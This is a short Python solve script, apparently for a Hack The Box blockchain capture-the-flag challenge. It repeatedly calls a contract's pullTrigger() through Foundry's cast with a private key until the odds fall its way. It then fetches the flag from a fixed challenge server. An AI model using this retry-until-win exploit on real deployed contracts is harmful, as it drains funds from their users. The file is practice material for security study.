from pwn import *
from os import system

while True:
    # try luck
    system("cast send $TARGET 'pullTrigger()' --rpc-url $RPC_URL --private-key $PVK") 
    
    # get flag
    with remote("94.237.53.3", 44539) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
        break